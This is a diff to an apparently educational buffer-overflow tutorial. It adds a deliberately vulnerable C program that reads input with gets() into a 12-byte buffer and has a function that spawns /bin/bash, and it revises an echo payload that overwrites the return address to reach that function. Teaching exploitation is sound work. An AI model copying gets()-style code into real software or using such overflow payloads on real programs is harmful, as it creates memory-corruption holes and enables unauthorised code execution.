@@ -12,14 +12,26 @@
 
 ```bash
 user@PC-Name:~# cat vulnerableCode.c
- 
+
 #include<stdio.h>
 #include<stdlib.h>
 
-int main( int argc,  char *argv[]){
-  char ans[10];
+
+void dangerousFunction()  {
+  printf("GIVING SHELL\n");
+  system("/bin/bash");
+}
+
+void getInput() {
+  char ans[12];
+  printf("String is at : %p\n",ans);
   gets(ans);
+  printf("String is at : %p\n",ans);
   puts(ans);
+}
+
+int main(){
+  getInput();
 
 }
 
@@ -103,7 +115,7 @@ End of assembler dump.
 <li type=1>Let us create our payload now</li>
 
 ```bash
-# In our case we needed 24bytes after which we can inject our actual payload.
+# In our case we needed 12+8+4 = 24bytes after which we can inject our actual payload.
 user@PC-Name:~# echo -e 'AAAAAAAAAAAAAAAAAAAAAAAA\x7d\x84\x04\x08'
 # Note the actual address passed is in reverse order (thanks to little endian)
 ```
